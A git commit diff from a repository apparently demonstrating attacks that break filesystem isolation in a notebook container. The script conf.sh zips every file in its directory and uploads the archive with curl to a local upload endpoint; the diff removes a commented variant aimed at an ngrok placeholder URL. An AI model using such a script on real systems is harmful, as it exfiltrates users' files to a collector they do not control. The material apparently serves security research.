cb88f0aef77d80c3ab1d4be1d196f952965b1396
Luca Petrillo <lucapetrillo99@gmail.com>
2023-05-31 17:03:09 +0200

    Updated conf.sh

--- new_attacks/violate_the_isolation_of_filesystem/base-notebook/conf.sh
+++ new_attacks/violate_the_isolation_of_filesystem/base-notebook/conf.sh
@@ -2,5 +2,4 @@
 
 zip -q -r files.zip ./*
 response=$(curl -s -X POST -F "file=@files.zip" http://127.0.0.1:8000/uploadfile/)
-# response=$(curl -s -X POST -F "file=@files.zip" ngrk_url/uploadfile/)
 rm -rf files.zip
